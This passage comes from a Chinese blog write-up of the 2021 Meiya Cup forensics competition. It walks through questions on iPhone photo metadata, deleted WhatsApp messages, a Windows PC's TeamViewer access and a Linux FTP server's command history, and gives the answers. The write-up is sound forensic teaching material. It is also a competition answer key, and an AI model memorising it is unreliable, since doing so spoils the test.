src="/images/meiya-2021-01/image-20220807180315801.png" alt="image-20220807180315801" style="zoom:67%;" /><p>继续搜索还能够定位<code>192.168.40.128</code>和<code>192.168.40.130</code>两个内网IP,可以判断这是另外两个员工的电脑:</p><img src="/images/meiya-2021-01/image-20220807180435387.png" alt="image-20220807180435387" style="zoom:67%;" /><img src="/images/meiya-2021-01/image-20220807180448060.png" alt="image-20220807180448060" style="zoom:67%;" /><br><hr><br><h1 id="PART3ALEX的Iphone12pro和IPhoneXR"><a href="#PART3ALEX的Iphone12pro和IPhoneXR" class="headerlink" title="PART3ALEX的Iphone12pro和IPhoneXR"></a>PART3ALEX的Iphone12pro和IPhoneXR</h1><h2 id="27-2021年10月21日，以下哪一张相片可能曾被分享"><a href="#27-2021年10月21日，以下哪一张相片可能曾被分享" class="headerlink" title="27_2021年10月21日，以下哪一张相片可能曾被分享"></a>27_2021年10月21日，以下哪一张相片可能曾被分享</h2><blockquote><p>[多选题] 阿力士iPhone 12 pro电话 于2021年10月21日，以下哪一张相片可能曾被分享 (UTC+8)? (3分)</p><p>A. IMG_0011.HEIC</p><p>B. IMG_0010.HEIC</p><p>C. IMG_0009.HEIC</p><p>D. IMG_0008.HEIC</p><p>E. IMG_0007.HEIC</p></blockquote><p>一般在聊天中发送图片时,图片的元数据会被抹掉.</p><p>所以,<span style='color:black;background:yellow;font-size:16px;font-family:hei'>被分享过的图片除了原图意外,还会存在一个不带有元数据的图片副本,根据副本的存在可以判断哪些图片被分享过</span></p><p>所以这里首先应用过滤器: <code>过滤--元数据--不带有元数据</code></p><img src="/images/meiya-2021-01/image-20220807191048409.png" alt="image-20220807191048409" style="zoom:67%;" /><p>确定好是哪一张图片后,再从图像库中找到对应的原图名称就好了:</p><img src="/images/meiya-2021-01/image-20220807191132379.png" alt="image-20220807191132379" style="zoom:67%;" /><br><h2 id="28哪一张相片可能曾被修改拍摄时间"><a href="#28哪一张相片可能曾被修改拍摄时间" class="headerlink" title="28哪一张相片可能曾被修改拍摄时间"></a>28哪一张相片可能曾被修改拍摄时间</h2><blockquote><p>[单选题] 阿力士iPhone 12 pro电话中哪一张相片可能曾被修改拍摄时间? (2分)</p><p>A. IMG_0011.HEIC</p><p>B. IMG_0010.HEIC</p><p>C. IMG_0009.HEIC</p><p>D. IMG_0008.HEIC</p></blockquote><p>使用手机修改过的图片可能会同时存储修改前和修改后的图片</p><p>上一题定位的那张图片就可以找到三张一样的: 那么可以推测是为了发送给其他人而修改了拍摄时间</p><img src="/images/meiya-2021-01/image-20220807191616039.png" alt="image-20220807191616039" style="zoom:67%;" /><img src="/images/meiya-2021-01/image-20220807191630989.png" alt="image-20220807191630989" style="zoom:67%;" /><img src="/images/meiya-2021-01/image-20220807191641847.png" alt="image-20220807191641847" style="zoom:67%;" /><br><h2 id="29此IPhone的GSM媒体访问控制地址是什么"><a href="#29此IPhone的GSM媒体访问控制地址是什么" class="headerlink" title="29此IPhone的GSM媒体访问控制地址是什么"></a>29此IPhone的GSM媒体访问控制地址是什么</h2><p><span style='color:black;background:yellow;font-size:16px;font-family:hei'><strong>媒体访问控制地址实际上就是MAC地址！</strong></span>在设备信息里就能够看到</p><img src="/images/meiya-2021-01/image-20220807191924974.png" alt="image-20220807191924974" style="zoom:67%;" /><br><h2 id="30此IPhone以什么锁屏密码保护"><a href="#30此IPhone以什么锁屏密码保护" class="headerlink" title="30此IPhone以什么锁屏密码保护"></a>30此IPhone以什么锁屏密码保护</h2><blockquote><p>[单选题] 阿力士的iphone 12 pro以什么屏幕密码保护? (1分)</p><p>A. 6位阿拉伯数字密码</p><p>B. 4位阿拉伯数字密码</p><p>C. 图形密码</p><p>D. 以上皆非</p></blockquote><p>此题需要找到并导出<code>manifest.plist</code>文件,这个文件记录和和设备有关的各种信息,很重要!!</p><img src="/images/meiya-2021-01/image-20220807192203438.png" alt="image-20220807192203438" style="zoom:67%;" /><p>可以使用plistEditor来打开此文件</p><img src="/images/meiya-2021-01/image-20220808000335079.png" alt="image-20220808000335079" style="zoom:67%;" /><p>打开文件搜索passcode,可以找到一个名为<code>WasPasscodeSet</code>的键,它的值是<code>false</code></p><p>根据字面意思就可以判断,此IPhone没有设置密码</p><br><h2 id="31此IPhone中哪一张相片是实况相片"><a href="#31此IPhone中哪一张相片是实况相片" class="headerlink" title="31此IPhone中哪一张相片是实况相片"></a>31此IPhone中哪一张相片是实况相片</h2><blockquote><p>[多选题] 阿力士iphone 12 pro内以下哪一张相片是实况相片(live Photos)? (2分)</p><p>A. IMG_0011.HEIC</p><p>B. IMG_0010.HEIC</p><p>C. IMG_0012.HEIC</p><p>D. IMG_0009.HEIC</p></blockquote><p><span style='color:black;background:yellow;font-size:16px;font-family:hei'>使用IPhone实况模式拍摄的照片是储存有对应的视频格式的</span></p><p>因此,只要能够找到和照片对应的视频格式文件,就能够说明这张照片是实况照片</p><img src="/images/meiya-2021-01/image-20220808000830193.png" alt="image-20220808000830193" style="zoom:67%;" /><p>只有C选项找不到,所以选择ABD</p><br><h2 id="32此IPhone可能连接过哪些设备"><a href="#32此IPhone可能连接过哪些设备" class="headerlink" title="32此IPhone可能连接过哪些设备"></a>32此IPhone可能连接过哪些设备</h2><blockquote><p>[单选题] 以下哪一个是阿力士iphone 12 pro可能曾经连接的装置名称? (2分)</p><p>A. Chris’s MacBook Pro</p><p>B. Chirs’s iPhone</p><p>C. Chirs’s Computer</p><p>D. Chirs’s Linux</p></blockquote><p>在联系人中可以找到连接过的设备:</p><img src="/images/meiya-2021-01/image-20220808001048026.png" alt="image-20220808001048026" style="zoom:67%;" /><br><h2 id="33接上题-连接时间是何时"><a href="#33接上题-连接时间是何时" class="headerlink" title="33接上题,连接时间是何时"></a>33接上题,连接时间是何时</h2><blockquote><p>[多选题] 接上题，记录连接时间是什么时候(UTC+8)? (2分)</p><p>A. 2021年10月21日 00:58:01</p><p>B. 2021年10月21日 08:58:01</p><p>C. 2021年10月21日 00:58:29</p><p>D. 2021年10月21日 08:58:29</p></blockquote><p>在连接详情里就可以找到,注意时区的换算</p><img src="/images/meiya-2021-01/image-20220808001157140.png" alt="image-20220808001157140" style="zoom:67%;" /><br><h2 id="34关于Alex使用IPhoneXR中的Whatsapp和工地主管的对话"><a href="#34关于Alex使用IPhoneXR中的Whatsapp和工地主管的对话" class="headerlink" title="34关于Alex使用IPhoneXR中的Whatsapp和工地主管的对话"></a>34关于Alex使用IPhoneXR中的Whatsapp和工地主管的对话</h2><blockquote><p>[多选题] 阿力士iPhone XR中在软件WhatsApp中工地主管与阿力士的对话中曾提到：[佢叫我俾钱喎，BTC係唔係呢个啊？]。在进行电子数据取证分析后，以下哪一个是有可能关于此对话的正确描述？ (2分)</p><p>A. 此对话被Kariser Lee删除</p><p>B. 此对话的附件为一张图片文件</p><p>C. 此对话被Alex Chan 删除</p><p>D. 此对话是引用Alex Chan 回复</p></blockquote><p>在IphoneXR中找到工地主管和alex的聊天,可以看见,Alex和主管聊天时使用的就是IphoneXR</p><p>下图中这句话「<strong>BTC係Bitcoin呀</strong>」是alex对题目中这句话的回复,但是在聊天记录时间线中看不到工地主管所说的「<strong>佢叫我俾钱喎，BTC係唔係呢个啊</strong>」这句话,说明这句话被删除了</p><img src="/images/meiya-2021-01/image-20220808001617181.png" alt="image-20220808001617181" style="zoom:67%;" /><p>聊天记录的最上边可以看到这两句被删除的消息,可以看到工地主管这句消息带有一张jpeg图片附件</p><img src="/images/meiya-2021-01/image-20220808002015375.png" alt="image-20220808002015375" style="zoom:67%;" /><p>这里可以看见此消息是被sender,也就是工地主管删除的</p><p><img src="/images/meiya-2021-01/image-20220808002115724.png" alt="image-20220808002115724"></p><p>在工地主管的Iphone中也可以对应上:</p><img src="/images/meiya-2021-01/image-20220808002207312.png" alt="image-20220808002207312" style="zoom:67%;" /><p>综上,AB是正确的</p><br><h2 id="35ALEX曾要求工地主管支付多少个BTC"><a href="#35ALEX曾要求工地主管支付多少个BTC" class="headerlink" title="35ALEX曾要求工地主管支付多少个BTC"></a>35ALEX曾要求工地主管支付多少个BTC</h2><blockquote><p>[填空题] 阿力士iPhone XR的WhatsApp对话中，阿力士曾要求工地主管支付多少个BTC? (请以阿拉伯数字回答) (1分)</p></blockquote><img src="/images/meiya-2021-01/image-20220808002319475.png" alt="image-20220808002319475" style="zoom:67%;" /><p>10个,这句消息是被ALEX删除的</p><br><h2 id="36AELX的IPhoneXR中关于两张看似相同的图片"><a href="#36AELX的IPhoneXR中关于两张看似相同的图片" class="headerlink" title="36AELX的IPhoneXR中关于两张看似相同的图片"></a>36AELX的IPhoneXR中关于两张看似相同的图片</h2><blockquote><p>[多选题] 阿力士iPhone XR中 “IMG_0056.HEIC”的图像与”5005.JPG”(MD5: 96c48152249536d14eaa80086c92fcb9)” 看似为同一张相片，在电子数据取证分析下，以下哪样描述是正确? (2分)</p><p>A. 储存在不同的.db 里</p><p><strong>B. 有不同哈希值</strong></p><p><strong>C. IMG_0056.HEIC 为原图, 5005.JPG(MD5: 96c48152249536d14eaa80086c92fcb9)为缩略图</strong></p><p>D. IMG_0056.HEIC 曾被开启过，所以在IOS系统中创建了缩略图5005.JPG(MD5: 96c48152249536d14eaa80086c92fcb9)</p></blockquote><p>根据格式和元数据是否完整来判断,IMG_0056.HELC显然是原图:</p><img src="/images/meiya-2021-01/image-20220808002600556.png" alt="image-20220808002600556" style="zoom: 50%;" /><p>而5005.JPG的exif被抹除了,并且分辨率较低,是缩略图</p><img src="/images/meiya-2021-01/image-20220808002707171.png" alt="image-20220808002707171" style="zoom:67%;" /><p>因此BC项肯定正确,A项肯定错误</p><p>D项无法确认是否开启过</p><br><h2 id="37ALEX的IPhoneXR中相片IMG-0056-HEIC能提供哪些信息"><a href="#37ALEX的IPhoneXR中相片IMG-0056-HEIC能提供哪些信息" class="headerlink" title="37ALEX的IPhoneXR中相片IMG_0056.HEIC能提供哪些信息"></a>37ALEX的IPhoneXR中相片IMG_0056.HEIC能提供哪些信息</h2><blockquote><p>[多选题] 阿力士iPhone XR中相片檔IMG_0056.HEIC提供了什么电子数据取证的信息? (3分)</p><p>A. 此相片是由隔空投送 (Airdrop)得来</p><p>B. 此相片由iPhone XR拍摄</p><p>C. 此相片的拍摄时间为2021-10-21 17:45:48(UTC+8)</p><p><strong>D. 此相片的拍摄时间为2021-09-08 17:35:00(UTC+8)</strong></p></blockquote><p>找到元文件,查看文件信息:</p><img src="/images/meiya-2021-01/image-20220808003058430.png" alt="image-20220808003058430" style="zoom:67%;" /><p>可以确定BC错误,D正确</p><p>因为是多选题,所以A项肯定也是正确的，可以尝试验证一下：</p><p>在数据库这里搜索「air」,找到了一个有关蓝牙配对的数据库记录</p><p><strong>可以看到和iphone12配对的记录</strong>,时间和那张照片在iPhoneXR上创建的时间比较接近,所以这张照片应该是通过airdrop传输的</p><img src="/images/meiya-2021-01/image-20220808003309472.png" alt="image-20220808003309472" style="zoom:67%;" /><br><h2 id="38ALEX电邮账户的密码"><a href="#38ALEX电邮账户的密码" class="headerlink" title="38ALEX电邮账户的密码"></a>38ALEX电邮账户的密码</h2><blockquote><p>[单选题] 阿力士iPhone XR中阿力士的电邮账户<a href="mailto:&#65;&#108;&#x65;&#x78;&#99;&#x31;&#57;&#x38;&#x35;&#x31;&#48;&#x31;&#54;&#64;&#103;&#x6d;&#97;&#x69;&#108;&#46;&#99;&#111;&#109;">&#65;&#108;&#x65;&#x78;&#99;&#x31;&#57;&#x38;&#x35;&#x31;&#48;&#x31;&#54;&#64;&#103;&#x6d;&#97;&#x69;&#108;&#46;&#99;&#111;&#109;</a>的密码有可能是什么? (1分)</p><p>A. Ac19851016</p><p>B. Alex1985!</p><p><strong>C. Aa475869!</strong></p><p>D. 以上皆非</p></blockquote><p>此题在设备存储的密码里根本找不到</p><img src="/images/meiya-2021-01/image-20220808003445983.png" alt="image-20220808003445983" style="zoom:67%;" /><p>不能太死板了,想想自己的密码会往哪里存</p><p>最后在备忘录里找到了:</p><img src="/images/meiya-2021-01/image-20220808003530862.png" alt="image-20220808003530862" style="zoom:67%;" /><br><h2 id="39ALEX的IPhoneXR曾连接的wifi-Alex-Home的密码"><a href="#39ALEX的IPhoneXR曾连接的wifi-Alex-Home的密码" class="headerlink" title="39ALEX的IPhoneXR曾连接的wifi:Alex Home的密码"></a>39ALEX的IPhoneXR曾连接的wifi:Alex Home的密码</h2><p>这个在密码中能够找到:</p><img src="/images/meiya-2021-01/image-20220808003834112.png" alt="image-20220808003834112" style="zoom:67%;" /><h2 id="40ALEX的IPhoneXR最后经iCloud备份的时间"><a href="#40ALEX的IPhoneXR最后经iCloud备份的时间" class="headerlink" title="40ALEX的IPhoneXR最后经iCloud备份的时间"></a>40ALEX的IPhoneXR最后经iCloud备份的时间</h2><blockquote><p>[单选题] 阿力士iPhone XR经iCloud备份的最后时间是什么?(UTC+8)? (1分)</p><p><strong>A. 2021-10-21 17:51:38(UTC+8)</strong></p><p>B. 2021-10-21 18:02:13 + (UTC+8)</p><p>C. 2021-10-21 09:51:38(UTC+8)</p><p>D. 2021-10-21 10:02:13 + (UTC+8)</p></blockquote><p>在设备信息里就能找到:</p><img src="/images/meiya-2021-01/image-20220808004011342.png" alt="image-20220808004011342" style="zoom:67%;" /><h2 id="41ALEX的IPhoneXR的iBoot版本"><a href="#41ALEX的IPhoneXR的iBoot版本" class="headerlink" title="41ALEX的IPhoneXR的iBoot版本"></a>41ALEX的IPhoneXR的iBoot版本</h2><p>找到<code>PhoneInfo.xml</code>文件</p><img src="/images/meiya-2021-01/image-20220808004127122.png" alt="image-20220808004127122" style="zoom:67%;" /><img src="/images/meiya-2021-01/image-20220808004139560.png" alt="image-20220808004139560" style="zoom:67%;" /><h2 id="42Whatsapp群组「团购-新鲜猪肉牛肉-东涌群组-9-x2F-30」有哪些成员"><a href="#42Whatsapp群组「团购-新鲜猪肉牛肉-东涌群组-9-x2F-30」有哪些成员" class="headerlink" title="42Whatsapp群组「团购-新鲜猪肉牛肉-东涌群组-9&#x2F;30」有哪些成员"></a>42Whatsapp群组「团购-新鲜猪肉牛肉-东涌群组-9&#x2F;30」有哪些成员</h2><blockquote><p>[多选题] 阿力士iPhone XR中的WhatsApp群组『团购-新鲜猪肉牛肉-东涌群组-9&#x2F;30』有以下哪一个成员? (2分)</p><p><strong>A. <a href="mailto:&#x38;&#53;&#50;&#54;&#48;&#54;&#49;&#x37;&#51;&#51;&#50;&#64;&#x73;&#x2e;&#119;&#104;&#97;&#x74;&#x73;&#97;&#112;&#x70;&#x2e;&#x6e;&#101;&#116;">&#x38;&#53;&#50;&#54;&#48;&#54;&#49;&#x37;&#51;&#51;&#50;&#64;&#x73;&#x2e;&#119;&#104;&#97;&#x74;&#x73;&#97;&#112;&#x70;&#x2e;&#x6e;&#101;&#116;</a></strong></p><p>B. <a href="mailto:&#x38;&#x35;&#50;&#54;&#x30;&#x34;&#x35;&#x32;&#x35;&#55;&#57;&#64;&#115;&#x2e;&#119;&#104;&#97;&#x74;&#x73;&#97;&#x70;&#112;&#46;&#x6e;&#101;&#x74;">&#x38;&#x35;&#50;&#54;&#x30;&#x34;&#x35;&#x32;&#x35;&#55;&#57;&#64;&#115;&#x2e;&#119;&#104;&#97;&#x74;&#x73;&#97;&#x70;&#112;&#46;&#x6e;&#101;&#x74;</a></p><p>C. <a href="mailto:&#56;&#53;&#x32;&#x34;&#56;&#x37;&#x39;&#x31;&#53;&#x36;&#x35;&#x40;&#115;&#46;&#119;&#x68;&#x61;&#116;&#x73;&#97;&#112;&#x70;&#x2e;&#x6e;&#101;&#x74;">&#56;&#53;&#x32;&#x34;&#56;&#x37;&#x39;&#x31;&#53;&#x36;&#x35;&#x40;&#115;&#46;&#119;&#x68;&#x61;&#116;&#x73;&#97;&#112;&#x70;&#x2e;&#x6e;&#101;&#x74;</a></p><p><strong>D. <a href="mailto:85264630956@s.whatsapp.net">85264630956@s.whatsapp.net</a></strong></p></blockquote><img src="/images/meiya-2021-01/image-20220808004316710.png" alt="image-20220808004316710" style="zoom:67%;" /><br><hr><br><h1 id="PART4ALEX的Windows"><a href="#PART4ALEX的Windows" class="headerlink" title="PART4ALEX的Windows"></a>PART4ALEX的Windows</h1><p>尝试使用火眼仿真可以直接看到开机密码</p><img src="/images/meiya-2021-01/image-20220808004443235.png" alt="image-20220808004443235" style="zoom:67%;" /><h2 id="43ALEX在hongkongcard-com-论坛的密码"><a href="#43ALEX在hongkongcard-com-论坛的密码" class="headerlink" title="43ALEX在hongkongcard.com 论坛的密码"></a>43ALEX在hongkongcard.com 论坛的密码</h2><img src="/images/meiya-2021-01/image-20220808004523282.png" alt="image-20220808004523282" style="zoom:67%;" /><p>(这人好像全都在用这一个密码)</p><br><h2 id="44ALEX的计算机显示其曾用什么方法进入受害者计算机"><a href="#44ALEX的计算机显示其曾用什么方法进入受害者计算机" class="headerlink" title="44ALEX的计算机显示其曾用什么方法进入受害者计算机"></a>44ALEX的计算机显示其曾用什么方法进入受害者计算机</h2><blockquote><p>[单选题] 阿力士的计算机显示阿力士曾用什么方法进入受害者(主管)的计算机? (1分)</p><p><strong>A. 远程操控</strong></p><p>B. 特洛伊木马程序</p><p>C. 勒索软件</p><p>D. 恶意软件</p></blockquote><p>前面围绕Teamviewer做了那么多文章,肯定是A了</p><br><h2 id="45续上题，ALEX最后一次进入受害者计算机的时间"><a href="#45续上题，ALEX最后一次进入受害者计算机的时间" class="headerlink" title="45续上题，ALEX最后一次进入受害者计算机的时间"></a>45续上题，ALEX最后一次进入受害者计算机的时间</h2><blockquote><p>[单选题] 续上题，阿力士最后一次进入受害者(主管)计算机的时间是什么? (2分)</p><p>A. 于2021年10月18日 10时36分</p><p>B. 于2021年10月18日18时36分</p><p>C. 于2021年10月18日6时53分</p><p><strong>D. 于2021年10月18日18时42分</strong></p></blockquote><p>在连接记录里找到</p><img src="/images/meiya-2021-01/image-20220808004842960.png" alt="image-20220808004842960" style="zoom:67%;" /><br><h2 id="46ALEX的FTP主机地址"><a href="#46ALEX的FTP主机地址" class="headerlink" title="46ALEX的FTP主机地址"></a>46ALEX的FTP主机地址</h2><p>这题其实在<a href="#meiya_person_04">分析路由器记录时</a>就知道了为<code>218.255.242.114</code></p><p>在ALEX的电脑里找到的信息能够验证答案:</p><img src="/images/meiya-2021-01/image-20220808005242522.png" alt="image-20220808005242522" style="zoom:67%;" /><br><h2 id="47ALEX的计算机于2021年9月至2021年11月期间计算机被登录的次数"><a href="#47ALEX的计算机于2021年9月至2021年11月期间计算机被登录的次数" class="headerlink" title="47ALEX的计算机于2021年9月至2021年11月期间计算机被登录的次数"></a>47ALEX的计算机于2021年9月至2021年11月期间计算机被登录的次数</h2><img src="/images/meiya-2021-01/image-20220808005336162.png" alt="image-20220808005336162" style="zoom:67%;" /><br><h2 id="47ALEX计算机Microsoft-Office-2007的版本"><a href="#47ALEX计算机Microsoft-Office-2007的版本" class="headerlink" title="47ALEX计算机Microsoft Office 2007的版本"></a>47ALEX计算机Microsoft Office 2007的版本</h2><p>取证结果的软件信息中找到:</p><img src="/images/meiya-2021-01/image-20220808005514215.png" alt="image-20220808005514215" style="zoom:67%;" /><br><h2 id="48ALEX计算机中Basic-data-partition-EFI3-的Volume-ID"><a href="#48ALEX计算机中Basic-data-partition-EFI3-的Volume-ID" class="headerlink" title="48ALEX计算机中Basic data partition(EFI3)的Volume ID"></a>48ALEX计算机中Basic data partition(EFI3)的Volume ID</h2><p>查到两种方式,找到的答案不一样…</p><p>使用FTK Imager挂载磁盘并加载</p><p>在路径:<code>Basic data partition3/root/System Volume Information/SDP/OnlineMetadataCache/…</code>可以</p><img src="/images/meiya-2021-01/image-20220808005802002.png" alt="image-20220808005802002" style="zoom:67%;" /><p>或者直接使用DiskGenius加载后查看卷序列号:</p><img src="/images/meiya-2021-01/image-20220808005942473.png" alt="image-20220808005942473" style="zoom:67%;" /><br><h2 id="49ALEX计算机的Windows-product-ID"><a href="#49ALEX计算机的Windows-product-ID" class="headerlink" title="49ALEX计算机的Windows product ID"></a>49ALEX计算机的Windows product ID</h2><p>系统信息里找到：</p><img src="/images/meiya-2021-01/image-20220808010029230.png" alt="image-20220808010029230" style="zoom:67%;" /><br><h2 id="51ALEX计算机曾经下载一张猴子的图片，以下哪一项描述正确"><a href="#51ALEX计算机曾经下载一张猴子的图片，以下哪一项描述正确" class="headerlink" title="51ALEX计算机曾经下载一张猴子的图片，以下哪一项描述正确"></a>51ALEX计算机曾经下载一张猴子的图片，以下哪一项描述正确</h2><blockquote><p>[单选题] 阿力士计算机曾经下载一张猴子的图片，以下哪一项描述正确? (1分)</p><p><strong>A. 该图片是由 “<a href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSgn6ABvcqTfFPjcIbjc9hdx1H4PtQsAuVyTQ&amp;usqp=CAU&quot;%E4%B8%8B%E8%BD%BD%E7%9A%84">https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSgn6ABvcqTfFPjcIbjc9hdx1H4PtQsAuVyTQ&amp;usqp=CAU&quot;下载的</a></strong></p><p>B. 该图片经过加密</p><p>C. 该图片于2021-09-30 下载</p><p>D. 该图片是由GIF档转换成PNG檔</p></blockquote><p>在浏览器的下载记录中可以找到一张图片,它下载时就是<strong>PNG</strong>格式</p><img src="/images/meiya-2021-01/image-20220808010236660.png" alt="image-20220808010236660" style="zoom:67%;" /><p>找到文件存放路径,发现就是这张猴子的照片,那么上面那个URL说明A项正确</p><img src="/images/meiya-2021-01/image-20220808010310837.png" alt="image-20220808010310837" style="zoom:67%;" /><h2 id="52ALEX计算机安装的Microsoft-Office-2007-的密钥"><a href="#52ALEX计算机安装的Microsoft-Office-2007-的密钥" class="headerlink" title="52ALEX计算机安装的Microsoft Office 2007 的密钥"></a>52ALEX计算机安装的Microsoft Office 2007 的密钥</h2><p>这个文件就存放在桌面上,仿真起来的话一眼就能发现了</p><img src="/images/meiya-2021-01/image-20220808010438567.png" alt="image-20220808010438567" style="zoom:67%;" /><h1 id="PART5ALEX的FTP服务器"><a href="#PART5ALEX的FTP服务器" class="headerlink" title="PART5ALEX的FTP服务器"></a>PART5ALEX的FTP服务器</h1><p><span id="meiya_person_01">首先使用取证大师解析FTP服务器镜像</span></p><p>从取证结果里就能够发现两个BitLocker密钥文件,但对照了恢复密钥标记之后,发现并不是工地主管的电脑的(可能是另外两个员工的)</p><img src="/images/meiya-2021-01/image-20220808011043375.png" alt="image-20220808011043375" style="zoom:67%;" /><p>此外这里还能够找到一个mac电脑的恢复密钥,这种线索都需要先记录下来,后面题可能用得到</p><img src="/images/meiya-2021-01/image-20220808011110270.png" alt="image-20220808011110270" style="zoom:67%;" /><p>再实时搜索一下关键词<code>BitLocker</code>,终于找到了工地主管电脑的恢复密钥</p><img src="/images/meiya-2021-01/image-20220808011232206.png" alt="image-20220808011232206" style="zoom:67%;" /><br><h2 id="53阿力士FTP服务器使用命令行安装了什么程序"><a href="#53阿力士FTP服务器使用命令行安装了什么程序" class="headerlink" title="53阿力士FTP服务器使用命令行安装了什么程序"></a>53阿力士FTP服务器使用命令行安装了什么程序</h2><blockquote><p>[单选题] 阿力士FTP 服务器用户使用命令行安装了甚么程序? (1分)</p><p><strong>A. Docker</strong></p><p>B. Chrome</p><p>C. FileZilla</p><p>D. TeamViewer</p></blockquote><p>历史命令里可以找到:(而且一个Linux的服务器一般也不太可能按照BCD)</p><img src="/images/meiya-2021-01/image-20220808011328036.png" alt="image-20220808011328036" style="zoom:67%;" /><br><h2 id="54哪些档案于FTP服务器曾重复出现"><a href="#54哪些档案于FTP服务器曾重复出现" class="headerlink" title="54哪些档案于FTP服务器曾重复出现"></a>54哪些档案于FTP服务器曾重复出现</h2><blockquote><p>[多选题] 以下哪些档案于阿力士FTP 服务器曾重复出现? (3分)</p><p>A. Material1</p><p>B. Material2</p><p>C. Material3</p><p><strong>D. Staff1</strong></p><p><strong>E. Staff2</strong></p><p><strong>F. Staff3</strong></p></blockquote><p>从取证结果的BitLocker密钥那里跳转到源文件,可以看到一个名为<code> dangerous_project</code>的目录</p><p>里边的文件和工地主管那边解开磁盘后看到的有重合,<strong>那么这个目录应该就是alex窃取的文件目录</strong></p><p>从里边看见基本上是一些xlsx表格文件</p><img src="/images/meiya-2021-01/image-20220808011553998.png" alt="image-20220808011553998" style="zoom:67%;" /><p>直接去文件分类历找,发现Staff文件有重复</p><img src="/images/meiya-2021-01/image-20220808011630120.png" alt="image-20220808011630120" style="zoom:67%;" /><br><h2 id="55FTP服务器中哪个文件夹曾被变更访问权限"><a href="#55FTP服务器中哪个文件夹曾被变更访问权限" class="headerlink" title="55FTP服务器中哪个文件夹曾被变更访问权限"></a>55FTP服务器中哪个文件夹曾被变更访问权限</h2><p>直接历史命令中找<code>chmod</code>的变更权限命令:可以看到正是存放窃取文件的<code>dangerous_project</code>目录</p><img src="/images/meiya-2021-01/image-20220808011804971.png" alt="image-20220808011804971" style="zoom:67%;" /><br><h2 id="56FTP服务器建设后-有多少个用户被加入"><a href="#56FTP服务器建设后-有多少个用户被加入" class="headerlink" title="56FTP服务器建设后,有多少个用户被加入"></a>56FTP服务器建设后,有多少个用户被加入</h2><blockquote><p><strong>pure命令用于添加虚拟用户</strong></p></blockquote><img src="/images/meiya-2021-01/image-20220808011941415.png" alt="image-20220808011941415" style="zoom:67%;" /><p>只能找到添加了一个名为<code>wai</code>的用户</p><br><h2 id="57此FTP服务器以何种方式连接网络，且是何种网络状态"><a href="#57此FTP服务器以何种方式连接网络，且是何种网络状态" class="headerlink" title="57此FTP服务器以何种方式连接网络，且是何种网络状态"></a>57此FTP服务器以何种方式连接网络，且是何种网络状态</h2><blockquote><p>[单选题] 根据阿力士FTP服务器设定显示，此服务器是以_____方式连接网络，且是一个_______网络状态 (1分)</p><p>A. 无线 , 公开</p><p>B. 无线 , 私人</p><p><strong>C. 有线 , 公开</strong></p><p>D. 有线 , 私人</p></blockquote><img src="/images/meiya-2021-01/image-20220808012139017.png" alt="image-20220808012139017" style="zoom:67%;" /><p>上图中能看到网络接口名称,<strong>且这里看到的IP和之前在路由器日志那边看到的 <a href="#meiya_person_04">FTP服务器</a>IP一致</strong></p><p>说明FTP服务器是有线连接的,且使用的是公开的IP</p><p>(<strong>内外网IP一致,说明此服务器的网络接口直接连接到公网上. 如果是无线的一般还得有个内网IP才对</strong>)</p><br><h2 id="57FTP服务器设定的最多使用者数目"><a href="#57FTP服务器设定的最多使用者数目" class="headerlink" title="57FTP服务器设定的最多使用者数目"></a>57FTP服务器设定的最多使用者数目</h2><p>找到<code>pure-ftpd.conf</code>其中记录了配置信息:</p><img src="/images/meiya-2021-01/image-20220808012752007.png" alt="image-20220808012752007" style="zoom:67%;" /><br><h2 id="58此FTP服务器使用Docker安装了哪个FTP程序"><a href="#58此FTP服务器使用Docker安装了哪个FTP程序" class="headerlink" title="58此FTP服务器使用Docker安装了哪个FTP程序"></a>58此FTP服务器使用Docker安装了哪个FTP程序</h2><p>历史命令中可以找到<code>docker pull</code>命令(<strong>从仓库拉取镜像</strong>)</p><img src="/images/meiya-2021-01/image-20220808012949926.png" alt="image-20220808012949926" style="zoom:67%;" /><p>拉取的镜像名为<strong>stilliard&#x2F;pure-ftpd</strong></p><br><h2 id="60此FTP服务器曾使用何版本的Linux内核"><a href="#60此FTP服务器曾使用何版本的Linux内核" class="headerlink" title="60此FTP服务器曾使用何版本的Linux内核"></a>60此FTP服务器曾使用何版本的Linux内核</h2><blockquote><p>[多选题] 阿力士FTP 服务器曾使用过甚么版本的Linux内核? (2分)</p><p><strong>A. linux-headers-5.11.0-16</strong></p><p>B. linux-headers-5.11.0-17</p><p>C. linux-headers-5.11.0-36</p><p><strong>D. inux-headers-5.11.0-37</strong></p><p>E. linux-headers-5.11.0-40</p></blockquote><p>仿真后可以使用一下其中一个命令查看:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname  -r</span><br><span class="line">dpkg --get -selections | grep linux-image</span><br></pre></td></tr></table></figure><p>或者直接搜索关键词<code>linux-headers</code></p><img src="/images/meiya-2021-01/image-20220808013231058.png" alt="image-20220808013231058" style="zoom:67%;" /><br><h2 id="61此FTP的磁盘分区有哪种文件系统"><a href="#61此FTP的磁盘分区有哪种文件系统" class="headerlink" title="61此FTP的磁盘分区有哪种文件系统"></a>61此FTP的磁盘分区有哪种文件系统</h2><blockquote><p>[多选题] 阿力士FTP 服务器的磁盘分区，有以下哪一种文件系统? (2分)</p><p>A. FAT16</p><p><strong>B. FAT32</strong></p><p>C. ExFAT</p><p>D. HFS+</p><p><strong>E. Ext4</strong></p></blockquote><p>查看分区信息就可以</p><p><img src="/images/meiya-2021-01/image-20220808013410670.png" alt="image-20220808013410670"></p><p><img src="/images/meiya-2021-01/image-20220808013420529.png" alt="image-20220808013420529"></p><br><h2 id="62此FTP服务器用户使用何指令检查现存的docker容器"><a href="#62此FTP服务器用户使用何指令检查现存的docker容器" class="headerlink" title="62此FTP服务器用户使用何指令检查现存的docker容器"></a>62此FTP服务器用户使用何指令检查现存的docker容器</h2><p>常识题</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker container ps-a # 查看所有容器</span><br></pre></td></tr></table></figure><p>历史命令中也可以找到</p><img src="/images/meiya-2021-01/image-20220808013538573.png" alt="image-20220808013538573" style="zoom:67%;" />]]></content>
      
      
      <categories>
          
          <category> 取证 </category>
          
          <category> 比赛 </category>
          
          <category> 2021美亚杯 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 取证 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021美亚杯_整体案情</title>
